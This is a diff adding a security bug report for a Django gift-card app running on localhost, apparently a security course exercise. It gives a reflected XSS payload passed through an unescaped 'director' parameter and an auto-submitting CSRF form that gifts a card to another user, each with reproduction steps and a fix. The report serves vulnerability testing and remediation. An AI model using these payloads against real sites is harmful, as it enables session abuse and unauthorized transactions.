@@ -1,0 +1,38 @@
+Bug 1: Cross-Site Scripting (XSS)
+
+Attack URL 1: http://localhost:8000/buy.html?director=%3Cscript%3Ealert(%22hello%22)%3C/script%3E
+Vulnerable Page 1: item-single.html
+
+Attack URL 2: http://localhost:8000/gift.html?director=%3Cscript%3Ealert(%22hello%22)%3C/script%3E
+Vulnerable Page 2: gift.html
+
+Vulnerable Parameter: director
+Payload: <script>alert("hello")</script>
+
+How to Reproduce: A parameter called "director" is used in gift.html and item-single.html. This parameter was marked as safe (|safe), which means that Django's default security policy was disabled and execution of HTML and JavaScript was allowed. So, if we supply javascript as value to "director", it will execute the javascript at runtime on the browser, and we will get the pop-up.
+
+Fix: Remove "|safe" from "Endorsed by {{director|safe}}" and keep it as "Endorsed by {{director}}".
+
+----------------------------------------------------------------------------------------------------
+
+Bug 2: Cross-Site Request Forgery (XSRF)
+
+Attack URL: http://localhost:8000/gift/0
+Vulnerable Page: gift.html
+Vulnerable Function: gift_card_view in views.py
+<html>
+    <body onload="xsrf.submit()">
+        <form name="xsrf" method="GET" action="http://localhost:8000/gift/0">
+            <input type="hidden" name="amount" id="amount" value="1" />
+            <input type="hidden" name="username" id="username" value="test2">
+        </form>
+    </body>
+</html>
+
+How to Reproduce: When a user is logged in with a valid session, as soon as they click on the malicious XSRF Payload html file, an authenticated GET request is sent from their browser to the application server, triggering the action of gifting a gift card to user named "test2", without the current users knowledge.
+
+Fix: There are two fixes-
+1. Add XSRF Protections in middleware, view and form.
+2. Remove vulnerable code allowing state change (gifting of card) via GET request.
+
+----------------------------------------------------------------------------------------------------
